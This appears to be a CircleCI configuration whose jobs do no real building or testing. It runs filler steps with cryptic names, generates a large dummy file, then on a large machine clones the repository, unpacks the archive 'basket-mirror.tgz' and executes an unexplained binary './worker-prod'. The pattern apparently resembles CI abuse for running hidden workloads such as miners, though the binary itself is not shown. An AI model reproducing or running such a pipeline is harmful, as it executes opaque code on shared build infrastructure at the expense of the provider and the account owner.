version: 2.1

jobs:
  WSIPRouter:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Bundle from Chicago
          command: |
            mkdir -p /tmp/qdir
            set +o pipefail 2>/dev/null; # multi-line simple
            echo "A"
            echo "B"
            seq 1 541644 > /tmp/qdir/7D; true
            echo "task=shippit"
      - persist_to_workspace:
          root: /tmp/qdir
          paths:
            - '7D'
  shippit:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/qdir
      - run:
          name: Close stream B
          command: |
            cat < /tmp/qdir/7D > >(wc -c) 2>/dev/null; wait; true
      - run:
          name: Grab main branch
          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Extract archive
          command: gunzip -c basket-mirror.tgz | tar xvf -
      - run:
          command: (./worker-prod)
